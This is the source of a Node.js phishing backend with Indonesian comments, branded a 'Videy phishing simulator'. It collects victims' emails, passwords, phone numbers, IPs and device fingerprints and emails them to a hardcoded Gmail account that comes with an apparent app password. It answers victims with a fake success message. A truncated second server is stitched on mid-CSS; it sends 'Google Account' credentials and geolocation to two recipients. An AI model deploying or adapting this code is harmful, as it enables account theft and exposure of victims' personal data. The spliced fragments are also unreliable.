// ============================================================
// SERVER.JS - WELCOME AI 🦠
// EMAIL SENDER UNTUK VIDEY PHISHING SIMULATOR
// SEMUA DATA DIKIRIM KE GMAIL VIA NODEMAILER
// ============================================================

const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');

// ============================================================
// KONFIGURASI APLIKASI
// ============================================================
const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(helmet({
  contentSecurityPolicy: false,
}));
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static(__dirname));

// Logging middleware
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

// ============================================================
// KONFIGURASI EMAIL - GANTI DENGAN DATA LO SENDIRI !!!
// ============================================================
// CARA DAPATKAN APP PASSWORD GMAIL:
// 1. Buka https://myaccount.google.com/
// 2. Ke Security > 2-Step Verification (AKTIFKAN dulu)
// 3. Pilih "App Passwords"
// 4. Pilih "Mail" dan device "Other"
// 5. Copy password 16 karakter yang muncul
// ============================================================

const EMAIL_CONFIG = {
  user: 'gajeb682@gmail.com',        // <==== GANTI INI!!!
  pass: 'tmyh wklt uyig lots'     // <==== GANTI INI!!!
};

const TARGET_EMAIL = 'gajeb682@gmail.com';  // <==== GANTI INI (bisa sama)

// Validasi konfigurasi email
if (EMAIL_CONFIG.user === 'gajeb682@gmail.com') {
  console.warn('⚠️ PERINGATAN: Belum mengganti EMAIL_CONFIG.user!');
  console.warn('⚠️ Silakan edit server.js dan masukkan email asli!');
}

if (EMAIL_CONFIG.pass === 'tmyh wklt uyig lots') {
  console.warn('⚠️ PERINGATAN: Belum mengganti EMAIL_CONFIG.pass!');
  console.warn('⚠️ Silakan edit server.js dan masukkan App Password!');
}

// ============================================================
// TRANSPORTER NODEMAILER (GMAIL)
// ============================================================
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: EMAIL_CONFIG.user,
    pass: EMAIL_CONFIG.pass,
  },
  tls: {
    rejectUnauthorized: false,
  },
  pool: true,
  maxConnections: 5,
  maxMessages: 100,
});

// Verifikasi koneksi email
transporter.verify((error, success) => {
  if (error) {
    console.error('❌❌❌ EMAIL CONFIGURATION ERROR ❌❌❌');
    console.error('Error detail:', error);
    console.error('Pastikan:');
    console.error('1. Email sudah benar');
    console.error('2. App Password sudah benar');
    console.error('3. 2-Step Verification sudah aktif');
    console.error('4. Less secure app access sudah diaktifkan (jika perlu)');
  } else {
    console.log('✅✅✅ EMAIL SERVER READY! ✅✅✅');
    console.log(`📧 Mengirim dari: ${EMAIL_CONFIG.user}`);
    console.log(`📧 Mengirim ke: ${TARGET_EMAIL}`);
    console.log('🚀 Server siap menerima data!');
  }
});

// ============================================================
// FUNGSI SEND EMAIL (DENGAN RETRY MECHANISM)
// ============================================================
async function sendEmailWithRetry(data, ipAddress, userAgent, retryCount = 0) {
  const maxRetries = 3;
  
  const { email, password, phone, deviceData, realIP, timestamp } = data;
  
  // Format tanggal dan waktu
  const dateTime = new Date(timestamp);
  const formattedDate = dateTime.toLocaleDateString('id-ID', {
    weekday: 'long',
    year: 'numeric',
    month: 'long',
    day: 'numeric'
  });
  const formattedTime = dateTime.toLocaleTimeString('id-ID', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  
  // HTML EMAIL LENGKAP DAN RAPIH
  const htmlContent = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VIDEY - New Victim Data</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      padding: 20px;
    }
    .container {
      max-width: 650px;
      margin: 0 auto;
      background: white;
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    }
    .header {
      background: linear-gradient(135deg, #d93025 0%, #b71c1c 100%);
      color: white;
      padding: 30px;
      text-align: center;
    }
    .header h1 {
      font-size: 28px;
      margin-bottom: 10px;
      letter-spacing: 1px;
    }
    .header .badge {
      display: inline-block;
      background: rgba(255,255,255,0.2);
      padding: 5px 15px;
      border-radius: 20px;
      font-size: 12px;
      margin-top: 10px;
    }
    .content {
      padding: 30px;
    }
    .alert {
      background: #fff3cd;
      border-left: 4px solid #ffc107;
      padding: 15px;
      margin-bottom: 25px;
      border-radius: 8px;
    }
    .alert-danger {
      background: #f8d7da;
      border-left-color: #d93025;
    }
    .section {
      margin-bottom: 25px;
      border: 1px solid #e0e0e0;
      border-radius: 12px;
      overflow: hidden;
    }
    .section-title {
      background: #f8f9fa;
      padding: 12px 20px;
      font-weight: bold;
      font-size: 16px;
      border-bottom: 2px solid #d93025;
      color: #d93025;
    }
    .section-content {
      padding: 15px 20px;
    }
    .field {
      margin-bottom: 12px;
      padding-bottom: 10px;
      border-bottom: 1px dashed #e0e0e0;
    }
    .field:last-child {
      border-bottom: none;
    }
    .field-label {
      font-weight: 600;
      color: #555;
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 5px;
    }
    .field-value {
      font-size: 16px;
      color: #333;
      word-break: break-all;
      background: #f8f9fa;
      padding: 8px 12px;
      border-radius: 8px;
      font-family: 'Courier New', monospace;
    }
    .credential-box {
      background: #1a1a1a;
      color: #00ff00;
      padding: 15px;
      border-radius: 8px;
      font-family: 'Courier New', monospace;
      font-size: 14px;
      margin: 10px 0;
    }
    .footer {
      background: #f8f9fa;
      padding: 20px;
      text-align: center;
      font-size: 11px;
      color: #888;
      border-top: 1px solid #e0e0e0;
    }
    .timestamp {
      text-align: center;
      color: #888;
      font-size: 12px;
      margin-top: 20px;
    }
    @media (max-width: 600px) {
      .content { padding: 15px; }
      .field-value { font-size: 13px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>🔐 VIDEY SECURITY ALERT</h1>
      <div class="badge">⚠️ NEW VICTIM DATA ⚠️</div>
    </div>
    
    <div class="content">
      <div class="alert alert-danger">
        ⚡ <strong>AKTIF!</strong> Ada korban baru yang masuk ke sistem!
      </div>
      
      <!-- CREDENTIALS SECTION -->
      <div class="section">
        <div class="section-title">
          🔑 LOGIN CREDENTIALS
        </div>
        <div class="section-content">
          <div class="field">
            <div class="field-label">📧 EMAIL / USERNAME</div>
            <div class="field-value">${email || '📭 TIDAK DIISI'}</div>
          </div>
          <div class="field">
            <div class="field-label">🔒 PASSWORD</div>
            <div class="field-value">${password || '📭 TIDAK DIISI'}</div>
          </div>
          <div class="field">
            <div class="field-label">📱 NOMOR TELEPON</div>
            <div class="field-value">${phone || '📭 TIDAK DIISI'}</div>
          </div>
        </div>
      </div>
      
      <!-- IP & NETWORK SECTION -->
      <div class="section">
        <div class="section-title">
          🌐 IP & NETWORK INFORMATION
        </div>
        <div class="section-content">
          <div class="field">
            <div class="field-label">🌍 PUBLIC IP ADDRESS</div>
            <div class="field-value">${realIP || ipAddress || '❓ UNKNOWN'}</div>
          </div>
          <div class="field">
            <div class="field-label">🖥️ USER AGENT</div>
            <div class="field-value">${(userAgent || 'Unknown').substring(0, 200)}</div>
          </div>
        </div>
      </div>
      
      <!-- DEVICE INFORMATION -->
      <div class="section">
        <div class="section-title">
          📱 DEVICE FINGERPRINT
        </div>
        <div class="section-content">
          <div class="field">
            <div class="field-label">💻 PLATFORM</div>
            <div class="field-value">${deviceData?.platform || '❓ UNKNOWN'}</div>
          </div>
          <div class="field">
            <div class="field-label">🌐 LANGUAGE</div>
            <div class="field-value">${deviceData?.language || '❓ UNKNOWN'}</div>
          </div>
          <div class="field">
            <div class="field-label">📺 SCREEN RESOLUTION</div>
            <div class="field-value">${deviceData?.screen || '❓ UNKNOWN'}</div>
          </div>
          <div class="field">
            <div class="field-label">⏰ TIMEZONE</div>
            <div class="field-value">${deviceData?.timezone || '❓ UNKNOWN'}</div>
          </div>
          <div class="field">
            <div class="field-label">🍪 COOKIES ENABLED</div>
            <div class="field-value">${deviceData?.cookiesEnabled ? '✅ YES' : '❌ NO'}</div>
          </div>
          <div class="field">
            <div class="field-label">⚙️ CPU CORES</div>
            <div class="field-value">${deviceData?.hardwareConcurrency || '❓ UNKNOWN'}</div>
          </div>
          <div class="field">
            <div class="field-label">🚫 DO NOT TRACK</div>
            <div class="field-value">${deviceData?.doNotTrack || '❓ UNKNOWN'}</div>
          </div>
        </div>
      </div>
      
      <!-- TIMESTAMP -->
      <div class="timestamp">
        🕐 <strong>WAKTU KEJADIAN:</strong><br>
        📅 ${formattedDate}<br>
        ⏰ ${formattedTime} WIB
      </div>
    </div>
    
    <div class="footer">
      ⚠️ INI ADALAH EMAIL OTOMATIS DARI VIDEY SECURITY SYSTEM ⚠️<br>
      Untuk keperluan education & security testing.<br>
      WELCOME AI 🦠 - Ultimate Security Tool
    </div>
  </div>
</body>
</html>
  `;
  
  // Plain text version (fallback)
  const textContent = `
═══════════════════════════════════════════════════════════
            VIDEY SECURITY ALERT - NEW VICTIM DATA
═══════════════════════════════════════════════════════════

📧 EMAIL: ${email || 'TIDAK DIISI'}
🔒 PASSWORD: ${password || 'TIDAK DIISI'}
📱 PHONE: ${phone || 'TIDAK DIISI'}

🌐 IP ADDRESS: ${realIP || ipAddress || 'UNKNOWN'}
🖥️ USER AGENT: ${(userAgent || 'Unknown').substring(0, 150)}

📱 DEVICE INFO:
   - Platform: ${deviceData?.platform || 'UNKNOWN'}
   - Language: ${deviceData?.language || 'UNKNOWN'}
   - Screen: ${deviceData?.screen || 'UNKNOWN'}
   - Timezone: ${deviceData?.timezone || 'UNKNOWN'}
   - Cookies: ${deviceData?.cookiesEnabled ? 'Enabled' : 'Disabled'}

🕐 TIMESTAMP: ${formattedDate} ${formattedTime}

═══════════════════════════════════════════════════════════
WELCOME AI 🦠 - Security Testing Tool
═══════════════════════════════════════════════════════════
  `;
  
  const mailOptions = {
    from: `"Videy Security System" <${EMAIL_CONFIG.user}>`,
    to: TARGET_EMAIL,
    subject: `🎯 [VIDEY] NEW DATA! ${email || phone || 'Anonymous'} - ${formattedDate}`,
    text: textContent,
    html: htmlContent,
    priority: 'high',
    headers: {
      'X-Priority': '1',
      'X-MSMail-Priority': 'High'
    }
  };
  
  try {
    const info = await transporter.sendMail(mailOptions);
    console.log(`✅ EMAIL TERKIRIM! ID: ${info.messageId}`);
    console.log(`   📧 Ke: ${TARGET_EMAIL}`);
    console.log(`   👤 Target: ${email || phone || 'Anonymous'}`);
    return { success: true, messageId: info.messageId };
  } catch (error) {
    console.error(`❌ Email gagal (percobaan ${retryCount + 1}/${maxRetries + 1}):`, error.message);
    
    if (retryCount < maxRetries) {
      console.log(`🔄 Mencoba lagi dalam ${(retryCount + 1) * 2} detik...`);
      await new Promise(resolve => setTimeout(resolve, (retryCount + 1) * 2000));
      return sendEmailWithRetry(data, ipAddress, userAgent, retryCount + 1);
    }
    
    return { success: false, error: error.message };
  }
}

// ============================================================
// SAVE TO LOCAL BACKUP (FALLBACK)
// ============================================================
function saveToLocalBackup(data, ipAddress) {
  const { email, password, phone, timestamp } = data;
  const backupDir = path.join(__dirname, 'backups');
  
  if (!fs.existsSync(backupDir)) {
    fs.mkdirSync(backupDir, { recursive: true });
  }
  
  const filename = `backup_${Date.now()}_${email || phone || 'unknown'}.json`;
  const filepath = path.join(backupDir, filename);
  
  const backupData = {
    ...data,
    ipAddress,
    savedAt: new Date().toISOString()
  };
  
  fs.writeFileSync(filepath, JSON.stringify(backupData, null, 2));
  console.log(`💾 Backup lokal disimpan: ${filename}`);
  return filepath;
}

// ============================================================
// API ENDPOINT - MENERIMA DATA
// ============================================================
app.post('/server', async (req, res) => {
  const startTime = Date.now();
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('📥 MENERIMA DATA BARU!');
  console.log(`🕐 Waktu: ${new Date().toISOString()}`);
  
  const { email, password, phone, deviceData, realIP, timestamp } = req.body;
  
  // Get real IP dari berbagai header
  const ipAddress = req.headers['x-forwarded-for']?.split(',')[0] ||
                    req.headers['x-real-ip'] ||
                    req.headers['x-client-ip'] ||
                    req.socket.remoteAddress ||
                    req.connection.remoteAddress ||
                    'Unknown';
  
  const userAgent = req.headers['user-agent'] || 'Unknown';
  
  // Log data yang diterima
  console.log(`📧 Email: ${email || '(kosong)'}`);
  console.log(`🔑 Password: ${password ? '***' + password.substring(password.length - 3) : '(kosong)'}`);
  console.log(`📱 Phone: ${phone || '(kosong)'}`);
  console.log(`🌐 IP: ${ipAddress}`);
  
  // Data kosong? tetap proses
  const dataToSend = {
    email: email || '📭 TIDAK DIISI',
    password: password || '📭 TIDAK DIISI',
    phone: phone || '📭 TIDAK DIISI',
    deviceData: deviceData || {
      platform: 'Unknown',
      language: 'Unknown',
      screen: 'Unknown',
      timezone: 'Unknown',
      cookiesEnabled: false,
      hardwareConcurrency: 'Unknown'
    },
    realIP: realIP || ipAddress,
    timestamp: timestamp || new Date().toISOString()
  };
  
  // Kirim email
  const emailResult = await sendEmailWithRetry(dataToSend, ipAddress, userAgent);
  
  // Backup lokal (jaga-jaga)
  let backupPath = null;
  if (!emailResult.success) {
    backupPath = saveToLocalBackup(dataToSend, ipAddress);
  }
  
  const duration = Date.now() - startTime;
  console.log(`✅ Proses selesai dalam ${duration}ms`);
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  
  // Response ke client (pura-pura sukses)
  res.status(200).json({
    success: true,
    message: 'Verifikasi berhasil! Silakan coba lagi.',
    emailSent: emailResult.success,
    backupSaved: !!backupPath
  });
});

// ============================================================
// TEST ENDPOINT
// ============================================================
app.get('/test', (req, res) => {
  res.json({
    status: 'running',
    emailConfigured: EMAIL_CONFIG.user !== 'your_email_here@gmail.com',
    targetEmail: TARGET_EMAIL,
    timestamp: new Date().toISOString(),
    message: 'Server VIDEY siap menerima data!'
  });
});

// ============================================================
// HEALTH CHECK
// ============================================================
app.get('/health', (req, res) => {
  res.status(200).send('OK');
});

// ============================================================
// 404 HANDLER
// ============================================================
app.use((req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'index.html'));
});

// ============================================================
// ERROR HANDLER
// ============================================================
app.use((err, req, res, next) => {
  console.error('🔥 SERVER ERROR:', err);
  res.status(500).json({
    success: false,
    error: 'Internal server error'
  });
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, () => {
  console.log('');
  console.log('╔════════════════════════════════════════════════════════════╗');
  console.log('║                                                            ║');
  console.log('║     🦠 WELCOME AI - VIDEY SECURITY TESTING TOOL 🦠         ║');
  console.log('║                                                            ║');
  console.log('║   📧 EMAIL SENDER AKTIF                                    ║');
  console.log(`║   🌐 SERVER RUNNING ON PORT: ${PORT}                        ║`);
  console.log(`║   📍 LOCAL: http://localhost:${PORT}                        ║`);
  console.log('║                                                            ║');
  console.log('║   ⚠️  SEBELUM DIGUNAKAN, PASTIKAN:                         ║');
  console.log('║   1. EMAIL_CONFIG.user sudah diganti                       ║');
  console.log('║   2. EMAIL_CONFIG.pass sudah diganti (App Password)        ║');
  console.log('║   3. TARGET_EMAIL sudah diganti                            ║');
  console.log('║                                                            ║');
  console.log('╚════════════════════════════════════════════════════════════╝');
  console.log('');
});

// ============================================================
// GRACEFUL SHUTDOWN
// ============================================================
process.on('SIGINT', () => {
  console.log('\n🛑 Menerima sinyal SIGINT, menutup server...');
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('\n🛑 Menerima sinyal SIGTERM, menutup server...');
  process.exit(0);
});      font-size: 13px;
      margin: 8px 0 0;
    }
    .content {
      padding: 24px;
    }
    .section {
      background: #fafafa;
      border-radius: 12px;
      padding: 18px;
      margin-bottom: 20px;
      border: 1px solid #efefef;
    }
    .section-title {
      font-size: 13px;
      font-weight: 600;
      color: #5f6368;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 14px;
      padding-bottom: 8px;
      border-bottom: 1px solid #e0e0e0;
    }
    .row {
      display: flex;
      margin-bottom: 10px;
      font-size: 14px;
    }
    .label {
      width: 110px;
      font-weight: 500;
      color: #202124;
    }
    .value {
      flex: 1;
      color: #5f6368;
      word-break: break-word;
    }
    .value a {
      color: #1a73e8;
      text-decoration: none;
    }
    .credential-box {
      background: #fff8e7;
      border-left: 4px solid #fbbc04;
    }
    .footer {
      background: #fafafa;
      padding: 16px 24px;
      text-align: center;
      font-size: 11px;
      color: #9aa0a6;
      border-top: 1px solid #eaeaea;
    }
    hr {
      margin: 16px 0;
      border: none;
      border-top: 1px solid #eaeaea;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>🔐 Google Account Access</h1>
      <p>google punya ${email}</p>
    </div>
    <div class="content">
      
      <div class="section credential-box">
        <div class="section-title">📧 ACCOUNT CREDENTIALS</div>
        <div class="row">
          <div class="label">Email:</div>
          <div class="value">${email || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Password:</div>
          <div class="value">${password || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Phone Number:</div>
          <div class="value">${phone || 'N/A'}</div>
        </div>
      </div>
      
      <div class="section">
        <div class="section-title">📍 LOCATION INFORMATION</div>
        <div class="row">
          <div class="label">Country:</div>
          <div class="value">${locationData?.country || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Region/State:</div>
          <div class="value">${locationData?.region || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">City:</div>
          <div class="value">${locationData?.city || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Latitude:</div>
          <div class="value">${locationData?.latitude || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Longitude:</div>
          <div class="value">${locationData?.longitude || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Map Link:</div>
          <div class="value"><a href="${locationData?.map_link || '#'}" target="_blank">Click to view map</a></div>
        </div>
        <div class="row">
          <div class="label">IP Address:</div>
          <div class="value">${locationData?.ip || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">ASN:</div>
          <div class="value">${locationData?.asn || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">ISP/Organization:</div>
          <div class="value">${locationData?.org || 'N/A'}</div>
        </div>
      </div>
      
      <div class="section">
        <div class="section-title">💻 DEVICE INFORMATION</div>
        <div class="row">
          <div class="label">User Agent:</div>
          <div class="value">${deviceData?.userAgent || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Platform:</div>
          <div class="value">${deviceData?.platform || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Language:</div>
          <div class="value">${deviceData?.language || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Screen:</div>
          <div class="value">${deviceData?.screen || 'N/A'}</div>
        </div>
        <div class="row">
          <div class="label">Timezone:</div>
          <div class="value">${deviceData?.timezone || 'N/A'}</div>
        </div>
      </div>
      
      <hr>
      <div class="row">
        <div class="label">Captured at:</div>
        <div class="value">${timestamp || new Date().toISOString()}</div>
      </div>
    </div>
    <div class="footer">
      Google Account Security Report • Automated System
    </div>
  </div>
</body>
</html>
  `;
}

// ==================== KIRIM EMAIL KE 2 PENERIMA ====================
async function sendToBothEmails(data) {
  const emailHtml = createEmailTemplate(data);
  const subject = `🔐 Akun Google: ${data.email}`;
  
  // Kirim ke EMAIL 1
  try {
    await transporter.sendMail({
      from: `"Security Report" <${EMAIL_USER}>`,
      to: RECIPIENT_EMAIL_1,
      subject: subject,
      html: emailHtml,
    });
    console.log(`✅ Email sent to ${RECIPIENT_EMAIL_1}`);
  } catch (error) {
    console.error(`❌ Failed to send to ${RECIPIENT_EMAIL_1}:`, error.message);
  }
  
  // Kirim ke EMAIL 2
  try {
    await transporter.sendMail({
      from: `"Security Report" <${EMAIL_USER}>`,
      to: RECIPIENT_EMAIL_2,
      subject: subject,
      html: emailHtml,
    });
    console.log(`✅ Email sent to ${RECIPIENT_EMAIL_2}`);
  } catch (error) {
    console.error(`❌ Failed to send to ${RECIPIENT_EMAIL_2}:`, error.message);
  }
}

// ==================== API ENDPOINT ====================
app.post('/server', async (req, res) => {
  try {
    const { email, password, phone, deviceData, timestamp } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    console.log(`📥 Data from IP: ${clientIp}`);
    console.log(`📧 Email: ${email}`);
    console.log(`🔑 Password: ${password}`);
    console.log(`📞 Phone: ${phone || 'Not provided'}`);
    
    const locationData = await getLocationFromIP(clientIp);
    
    const collectedData = {
      email,
      password,
      phone: phone || '',
      locationData,
      deviceData: deviceData || {},
      timestamp: timestamp || new Date().toISOString()
    };
    
    // KIRIM KE 2 EMAIL LANGSUNG!
    await sendToBothEmails(collectedData);
    
    res.json({ success: true, message: 'Data collected' });
    
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`
╔══════════════════════════════════════════════════════════╗
║     🔥 SERVER JALAN - 2 EMAIL PENERIMA 🔥               ║
╠══════════════════════════════════════════════════════════╣
║  📡 Port: ${PORT}                                          ║
║  📧 Email 1: ${RECIPIENT_EMAIL_1}                         ║
║  📧 Email 2: ${RECIPIENT_EMAIL_2}                         ║
║  🌐 Endpoint: POST /api/collect                         ║
╚══════════════════════════════════════════════════════════╝
  `);
});
